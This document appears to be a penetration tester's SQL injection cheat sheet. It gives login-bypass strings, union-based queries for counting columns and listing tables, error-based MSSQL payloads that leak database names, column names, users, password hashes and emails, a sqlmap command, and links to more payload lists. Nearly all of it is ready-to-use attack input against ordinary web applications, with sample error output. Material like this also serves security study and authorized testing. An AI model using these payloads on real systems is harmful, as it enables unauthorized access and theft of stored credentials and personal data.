### Authentication Bypass
| Username | Password |	SQL Query |
| --- | --- | --- |
| tom | tom | SELECT * FROM users WHERE name='tom' and password='tom' |
| tom | ' or '1'='1 | SELECT * FROM users	WHERE name='tom' and password='' or '1'='1' |
| tom | ' or 1='1 | SELECT * FROM users WHERE name='tom' and password='' or 1='1' |
| tom | 1' or 1=1 -- - | SELECT * FROM users WHERE name='tom' and password='' or 1=1-- -' |
| ' or '1'='1	| ' or '1'='1 |	SELECT * FROM users WHERE name='' or '1'='1' and password='' or '1'='1' |
| ' or ' 1=1  |	' or ' 1=1 | SELECT * FROM users WHERE name='' or ' 1=1' and password='' or ' 1=1' |
| 1' or 1=1 -- - | 	blah | SELECT * FROM users WHERE name='1' or 1=1 -- -' and password='blah' |

### Union Based 
Union based attack rely on us getting visual feedback and working us through the database, tables, columns in order to get the information we need.

Number of Columns
Find amount of columns by trying to order after column 1,2,3,… if it starts crashing you know that this columns does not exist
' or '1'='1'  ORDER BY 1--
' or '1'='1'  ORDER BY 2--
' or '1'='1'  ORDER BY 3--
…..

### Find DB Version
Now that we know the amount of columns check if its possible to get the version with something like below. Also try putting the @@version at different spots.

' UNION ALL SELECT 1,2; -- # Works
' UNION ALL SELECT 1,@@version; -- # Crashes
' UNION ALL SELECT @@version,2; -- # Works

### Get Tables
' Union All Select table_name,db_name() from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc; -- ## fails
' Union All Select table_name,                  2 from (select top 10 table_name from information_schema.tables order by 1) as shit order by 1 desc; -- ## WORKS !!
'Union All Select name,2 FROM master..sysdatabases ; --

Extract Information from table

Table Columns
'Union All Select column_name,2 from (select top 10 column_name from information_schema.columns where table_name='users' order by 1) as shit order by 1 desc;--

Data from users
'Union All Select name,2 from users;--
'Union All Select pass,2 from users;--

### Error Based
More info:
- https://webcache.googleusercontent.com/search?q=cache:KtfxjonYw58J:https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/+&cd=1&hl=en&ct=clnk&gl=fr

Its about triggering an error that will give us information e.g. does a mismatch from variable types cause error.

#### DB information
whatever',(select 1 from xyz where @@version=1)) -- #

Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
Aug 22 2017 17:04:49
Copyright (C) 2017 Microsoft Corporation
Express Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
' to data type int.

whatever',(select 1 from xyz where db_name()=1)) -- # Iterated over the db IDs
Conversion failed when converting the nvarchar value 'newsletter' to data type int.

whatever = regular input
xyz = does not matter since we want the info from the error


### Find DB Names
Replace N with DB ID

Get 5 tables from master.sys.sql and convert the db_name to int to trigger error
whatever' ,(select 5 from master.sys.sql_logins where 1=1 AND 1=CONVERT(INT,db_name(N))))--
whatever' ,(select 5 from master.sys.sql_logins where 1=1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=N))))--

User information
User
whatever',(select 1 from users where user=1)) --

DB User
whatever',(select 5 from master.sys.sql_logins where name=2)) --

Password Hash (Needs permission)
whatever',(cast(select 1 from master.sys.sql_logins where password_hash='1'))AS int) ---


Extract Column names
Replace N with column number

whatever' ,(select 5 from master.sys.sql_logins where 1=1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))) --

Extract Data From Table
Replace N with row number

whatever' ,(select 5 from master.sys.sql_logins where 1=1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 email FROM (SELECT top N email FROM users ORDER BY email ASC) sq ORDER BY email  DESC)+CHAR(58)+CHAR(58))))) --

# Automatic

## SQLMAP
Save the login-request, which contains the username and pw.
/sqlmap.py -r search-test.txt -p tfUPass

# NoSQL
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
Check out Mango notes


### More info
- https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
- https://blog.safebuff.com/2016/04/11/SQL-Injection-Cheat-Sheet-MSSQL/
- http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- Blind SQL Injection Examples --> https://portswigger.net/web-security/sql-injection/blind
- Injection Payload List --> https://github.com/payloadbox/sql-injection-payload-list
